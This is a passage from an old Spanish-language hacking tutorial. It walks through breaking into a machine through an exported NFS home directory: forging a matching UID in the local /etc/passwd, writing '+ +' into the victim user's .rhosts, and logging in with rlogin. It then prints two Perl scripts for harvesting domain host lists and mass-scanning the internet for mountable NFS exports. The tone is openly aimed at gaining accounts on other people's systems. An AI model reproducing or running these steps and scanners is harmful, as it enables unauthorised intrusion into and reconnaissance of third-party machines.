<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxr-xr-x&nbsp;&nbsp;
3 at1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jun 22 19:18 at1/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 dr-xr-xr-x&nbsp;&nbsp;
8 ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jul 12 14:20 ftp/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxrx-r-x&nbsp;&nbsp;
3 john&nbsp;&nbsp;&nbsp;&nbsp; 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jul&nbsp; 6 13:42 john/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxrx-r-x&nbsp;&nbsp;
3 139&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Sep 15 12:24 paul/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 -rw-------&nbsp;&nbsp;
1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
242 Mar&nbsp; 9&nbsp; 1997 sudoers</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwx------&nbsp;&nbsp;
3 test&nbsp;&nbsp;&nbsp;&nbsp; 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Oct&nbsp; 8 21:05 test/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwx------&nbsp;
15 102&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Oct 20 18:57 rapper/</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Vemos que hay un usuario
llamado rapper cuyo UID (User Identification) es 102 por lo que lo tendremos
que incluir en el /etc/passwd de nuestra maquina:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>mimaquina:~>echo "rapper::102:2::/tmp/mount:/bin/csh"
>> /etc/passwd</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>mimaquina:~>su - rapper</font></font>
<br><font face="Arial,Helvetica"><font size=-1>Welcome to rapper's user.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>mimaquina:~>ls -lsa /tmp/mount/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; total 9</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxrwxr-x&nbsp;&nbsp;
8 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jul&nbsp; 4 20:34 ./</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxr-xr-x&nbsp;
19 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Oct&nbsp; 8 13:42 ../</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxr-xr-x&nbsp;&nbsp;
3 at1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jun 22 19:18 at1/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 dr-xr-xr-x&nbsp;&nbsp;
8 ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jul 12 14:20 ftp/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxrx-r-x&nbsp;&nbsp;
3 john&nbsp;&nbsp;&nbsp;&nbsp; 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jul&nbsp; 6 13:42 john/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxrx-r-x&nbsp;&nbsp;
3 139&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Sep 15 12:24 paul/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 -rw-------&nbsp;&nbsp;
1 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
242 Mar&nbsp; 9&nbsp; 1997 sudoers</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwx------&nbsp;&nbsp;
3 test&nbsp;&nbsp;&nbsp;&nbsp; 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Oct&nbsp; 8 21:05 test/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwx------&nbsp;
15 rapper&nbsp;&nbsp; daemon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Oct
20 18:57 rapper/</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Asi, poseemos el directorio
de rapper por lo que podemos usar las propiedades del .rhosts ( escribimos
+ + en su .rhosts y luego hacemos un rlogin):</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>mimaquina:~>echo "+ +" >
rapper/.rhosts</font></font>
<br><font face="Arial,Helvetica"><font size=-1>mimaquina:~>cd /</font></font>
<br><font face="Arial,Helvetica"><font size=-1>mimaquina:~>rlogin –l rapper
victima.com</font></font>
<br><font face="Arial,Helvetica"><font size=-1>Welcome to Victima.Com.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>SunOs ver....(crap).</font></font>
<br><font face="Arial,Helvetica"><font size=-1>victima:~$</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>y ya tienes una cuenta en
el sistema &iexcl;!</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Para desmontar el archivo,
sal de este directorio y ejecuta:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>mimaquina:~> umount /tmp/mount</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Tened en cuenta que para
este metodo, hemos de tener acceso a la maquina por rlogin, asi que si
no es el caso, este metodo tambien admite otras posibilidades pero eso
se deja para otro texto :)</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Como lo mas co&ntilde;azo
de este metodo es buscar maquinas con ficheros exportables, a continuacion
expongo un script escrito por Invisble Evil en perl que te permite buscar
automaticamente. Para usarlo previamente se han de conseguir listas de
maquinas que se pueden obtener usando el host –l nombredominio > salida
y luego usando un script para obtener los ip del fichero salida o se pueden
obtener listas de maquinas que hay en internic (se obtienen por ftp de
rs.internic.net) y que son listas de maquinas con esa extension:</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>com.zone.gz</font></font>
<br><font face="Arial,Helvetica"><font size=-1>edu.zone.gz</font></font>
<br><font face="Arial,Helvetica"><font size=-1>gov.zone.gz</font></font>
<br><font face="Arial,Helvetica"><font size=-1>mil.zone.gz</font></font>
<br><font face="Arial,Helvetica"><font size=-1>net.zone.gz</font></font>
<br><font face="Arial,Helvetica"><font size=-1>org.zone.gz</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>cuando tengas estos files
bajados y tras hacer un gunzip, tendras que ejecutar el script en perl:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>"perl getdomain.pl com.zone
com >com.all"</font></font>
<br><font face="Arial,Helvetica"><font size=-1>perl getdomain.pl edu.zone
edu >edu.all</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Y asi con todos, obteniendo
ficheros com.all, edu.all y sucesivamente donde tendras la lista de maquinas.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>getdomain.pl</font></font>
<br><font face="Arial,Helvetica"><font size=-1>---- cut here</font></font>
<br><font face="Arial,Helvetica"><font size=-1>#!/usr/bin/perl</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1># GetDomain By Nfin8 / Invisible
Evil</font></font>
<br><font face="Arial,Helvetica"><font size=-1># Questions /msg i-e&nbsp;
or&nbsp; /msg i^e</font></font>
<br><font face="Arial,Helvetica"><font size=-1>#</font></font>
<br><font face="Arial,Helvetica"><font size=-1># Retrieve command line
arguments.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my($inputfile, $domain)
= @ARGV;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>usage() if (!defined($inputfile)
|| !defined($domain));</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1># Open and preprocess the
input file.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>open(INFILE, "&lt;$inputfile")
or die("Cannot open file $inputfile for reading!\n");</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my(@lines) = &lt;INFILE>;</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1># Initialize main data structure.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my(%hash) = {};</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my($key) = "";</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>foreach (@lines) {</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; $key = (split(/\
/))[0];</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; chop($key);</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; next if ((($key =~
tr/.//) &lt; 1) ||</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(uc($domain) ne uc(((split(/\./, $key))[-1]))) ||</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
($key =~ m/root-server/i));</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; $hash{$key}++;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>}</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1># Close input file and output
data structure to STDOUT.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>close(INFILE);</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>foreach (sort(keys(%hash)))
{</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; print "$_\n";</font></font>
<br><font face="Arial,Helvetica"><font size=-1>}</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>sub usage {</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; print("\n\ngetdomain:\n");</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; print("Usage: getdomain
[inputfile] [search]\n\n");</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; print("Where [search]
is one of \'com\', \'edu\', \'gov\', \'mil\' or \'net\'.\n\n");</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; exit(0);</font></font>
<br><font face="Arial,Helvetica"><font size=-1>}</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>0;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>---- cut here - end of script
-----</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Tras obtener la lista de
maquinas usando el anterior script (edu.all, com.all, etc..), se ha de
usar el script que se expone a continuacion para obtener los resultados
del showmount –e:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>En cada dominio, este script
busca si hay discos montables y guarda la info en el directorio actual
en ficheros llamados domain.XXX.export... asi solo tienes que ver estos
logs y mirar si ha habido suerte !!!!</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>--------------- start of
cmount.pl</font></font>
<br><font face="Arial,Helvetica"><font size=-1>#/usr/bin/perl -w</font></font>
<br><font face="Arial,Helvetica"><font size=-1>#</font></font>
<br><font face="Arial,Helvetica"><font size=-1># Check NFS exports of hosts
listed in file.</font></font>
<br><font face="Arial,Helvetica"><font size=-1># (Hosts are listed, once
per line with no additional whitespaces.)</font></font>
<br><font face="Arial,Helvetica"><font size=-1>#</font></font>
<br><font face="Arial,Helvetica"><font size=-1># ii@dormroom.pyro.net -
2/27/97.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1># Assign null list to @URLs
which will be added to later.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my(@result) = ();</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my(@domains) = ();</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my($program) = "showmount
-e ";</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1># Pull off filename from
commandline. If it isn't defined, then assign default.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>my($DomainFilename) = shift;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>$DomainFilename = "domains"
if !defined($DomainFilename);</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1># Do checking on input.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>die("mountDomains: $DomainFilename
is a directory.\n") if (-d $DomainFilename);</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;</font></font>
<br><font face="Arial,Helvetica"><font size=-1># Open $DomainFilename.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>open(DOMAINFILE, $DomainFilename)
or</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; die("mountDomains:
Cannot open $DomainFilename for input.\n");</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>while (&lt;DOMAINFILE>)
{</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; chomp($_);</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; print "Now checking:
$_";</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp; # Note difference
in program output capture from "geturl.pl".</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; open (EXECFILE, "$program
$_ |");</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; @execResult = &lt;EXECFILE>;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; next if (!defined($execResult[0]));</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; if ($execResult[0]
=~ /^Export/) {</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp; print
" - Export list saved.";</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp; open
(OUTFILE, ">$_.export");</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp; foreach
(@execResult) {</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
print OUTFILE;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp; }</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp; close
(OUTFILE);</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; }</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; close(EXECFILE);</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp; print "\n";</font></font>
<br><font face="Arial,Helvetica"><font size=-1>}</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;</font></font>
<br><font face="Arial,Helvetica"><font size=-1># We are done. Close all
files and end the program.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>close (DOMAINFILE);</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>0;</font></font>
<br><font face="Arial,Helvetica"><font size=-1>----------------- end of
cmount.pl</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Una nota final a todo este
co&ntilde;azo, lo pongo aqui para que solo lo lean los que se leen los
textos enteros (jeje) es que /export/foo es el home directory del usuario
guest por lo que aunque no nos dejen exportar el directorio /home, en caso
de que nos dejen exportar el directorio /export, se podra aplicar este
mismo metodo pero teniendo en cuenta de que en lugar de usar el usuario
rapper se usara el usuario guest</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>suerte ahi fuera......</font></font>
<br>&nbsp;
</body>
</html>
